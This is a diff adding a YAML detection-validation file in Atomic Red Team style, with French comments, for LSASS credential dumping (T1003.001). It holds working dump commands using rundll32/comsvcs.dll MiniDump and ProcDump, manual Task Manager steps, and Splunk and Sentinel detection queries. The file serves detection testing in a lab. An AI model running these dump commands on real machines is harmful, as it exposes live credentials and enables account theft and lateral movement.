@@ -1,0 +1,69 @@
+attack_technique: T1003.001
+display_name: LSASS Credential Dumping
+related_sigma_rule: ../credential_dumping_lsass.yml
+expected_alert_within_seconds: 30
+prerequisites:
+  - Windows lab isolé HORS production AD
+  - Sysmon avec EID 10 (ProcessAccess) activé sur lsass.exe
+  - EDR en mode AUDIT uniquement (sinon il bloquera le PoC)
+  - PRIVILÈGES ADMIN locaux requis
+warning: |
+  TESTS DESTRUCTIFS POTENTIELS — produire un dump LSASS RÉVÈLE des credentials
+  réels. Exécuter UNIQUEMENT sur un poste lab sans données sensibles. Détruire
+  les fichiers .dmp produits immédiatement après le test.
+atomic_tests:
+  - name: Dump LSASS via comsvcs.dll (LOLBin)
+    description: |
+      Technique LOLBin la plus utilisée par les attaquants : rundll32 +
+      MiniDump exporté de comsvcs.dll. Doit déclencher le GrantedAccess 0x1FFFFF.
+    supported_platforms: [windows]
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        for /f "tokens=2" %a in ('tasklist ^| findstr /i lsass') do (
+          rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %a C:\Windows\Temp\lsass_test.dmp full
+        )
+      cleanup_command: |
+        del /F /Q C:\Windows\Temp\lsass_test.dmp 2>nul
+
+  - name: Dump LSASS via ProcDump (SysInternals)
+    description: |
+      ProcDump avec -ma sur lsass.exe. Doit déclencher GrantedAccess 0x1FFFFF
+      ou 0x1410.
+    supported_platforms: [windows]
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_pd.dmp
+      cleanup_command: del /F /Q C:\Windows\Temp\lsass_pd.dmp 2>nul
+
+  - name: Dump LSASS via Task Manager (UI manual test)
+    description: |
+      Test manuel : ouvrir Task Manager élevé, clic droit sur lsass.exe →
+      "Create dump file". Permet de valider la couverture de la règle pour
+      les méthodes interactives.
+    supported_platforms: [windows]
+    executor:
+      name: manual
+      elevation_required: true
+      steps:
+        - 'Ouvrir Task Manager (Ctrl+Shift+Esc) en tant qu''admin'
+        - 'Onglet Details → clic droit sur lsass.exe → "Create dump file"'
+        - 'Vérifier la génération de l''alerte Sigma'
+        - 'Supprimer immédiatement le fichier .dmp produit'
+validation_queries:
+  splunk: |
+    index=sysmon EventCode=10 TargetImage="*\\lsass.exe" earliest=-15m
+    | where match(GrantedAccess, "(?i)0x(1010|1410|1438|143A|1FFFFF|1F1FFF)")
+    | table _time, host, SourceImage, GrantedAccess, CallTrace
+  sentinel: |
+    DeviceEvents
+    | where Timestamp > ago(15m) and ActionType == "OpenProcessApiCall"
+    | where AdditionalFields has "lsass.exe"
+    | extend ga = tostring(parse_json(AdditionalFields).DesiredAccess)
+    | where ga in ("0x1010","0x1410","0x1438","0x143A","0x1FFFFF","0x1F1FFF")
+references:
+  - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.001
+  - https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/
